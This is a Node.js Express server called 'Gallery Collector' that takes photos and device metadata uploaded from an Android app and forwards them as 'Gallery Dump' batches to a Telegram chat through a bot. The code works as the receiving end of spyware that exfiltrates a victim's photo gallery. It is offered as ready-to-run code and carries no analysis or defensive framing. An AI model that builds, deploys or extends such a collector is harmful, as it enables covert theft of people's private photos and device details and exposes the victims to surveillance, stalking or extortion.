const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;

// Configure multer for memory storage (no disk)
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 }
});

// ===== TELEGRAM CONFIG =====
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.CHAT_ID || '@INIESTADABOSS';

// ===== ENDPOINT: Receive photos from app =====
app.post('/upload', upload.array('photos', 30), async (req, res) => {
    try {
        const metadata = JSON.parse(req.body.metadata || '{}');
        const files = req.files;

        if (!files || files.length === 0) {
            return res.status(400).json({ error: 'No photos provided' });
        }

        console.log(`📸 Received ${files.length} photos from ${metadata.device_model || 'Unknown device'}`);
        console.log(`📱 Device ID: ${req.headers['x-device-id'] || 'Unknown'}`);
        console.log(`📦 Package: ${metadata.package_name || 'Unknown'}`);
        console.log(`🤖 Android: ${metadata.android_version || 'N/A'}`);

        // Send to Telegram in batches of 10
        const batchSize = 10;
        let successCount = 0;
        
        for (let i = 0; i < files.length; i += batchSize) {
            const batch = files.slice(i, i + batchSize);
            const batchNum = Math.floor(i / batchSize) + 1;
            
            try {
                await sendToTelegram(batch, metadata, batchNum);
                successCount += batch.length;
                console.log(`✅ Batch ${batchNum} sent (${batch.length} photos)`);
            } catch (error) {
                console.error(`❌ Batch ${batchNum} failed:`, error.message);
            }
            
            if (i + batchSize < files.length) {
                await sleep(2000);
            }
        }

        res.json({ 
            status: 'success', 
            received: files.length,
            forwarded: successCount,
            timestamp: Date.now()
        });

    } catch (error) {
        console.error('Server error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ===== Send photos to Telegram =====
async function sendToTelegram(photos, metadata, batchNum) {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);

    const mediaArray = [];

    const caption = `📸 *Gallery Dump Batch ${batchNum}*\n\n` +
                   `📱 Device: ${metadata.device_model || 'Unknown'}\n` +
                   `🤖 Android: ${metadata.android_version || 'N/A'}\n` +
                   `📦 App: ${metadata.package_name || 'Unknown'}\n` +
                   `🕐 ${new Date(metadata.timestamp).toLocaleString()}\n` +
                   `📊 Photos: ${photos.length} in this batch`;

    const firstMedia = {
        type: 'photo',
        media: 'attach://photo0',
        caption: caption,
        parse_mode: 'Markdown'
    };
    mediaArray.push(firstMedia);

    for (let i = 1; i < photos.length; i++) {
        mediaArray.push({
            type: 'photo',
            media: `attach://photo${i}`
        });
    }

    form.append('media', JSON.stringify(mediaArray));

    photos.forEach((photo, index) => {
        form.append(`photo${index}`, photo.buffer, {
            filename: `photo${index}.jpg`,
            contentType: photo.mimetype || 'image/jpeg'
        });
    });

    // THE KEY PART: Sends to Telegram using your bot token
    const response = await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`,
        form,
        {
            headers: {
                ...form.getHeaders(),
                'Content-Type': `multipart/form-data; boundary=${form.getBoundary()}`
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 60000
        }
    );

    if (response.status !== 200) {
        throw new Error(`Telegram returned ${response.status}`);
    }

    return response.data;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ===== Health check =====
app.get('/', (req, res) => {
    res.json({
        status: 'alive',
        service: 'Gallery Collector',
        version: '1.0.0',
        bot_configured: BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE'
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Telegram: ${CHAT_ID}`);
    console.log(`📸 Ready to receive gallery dumps`);
});
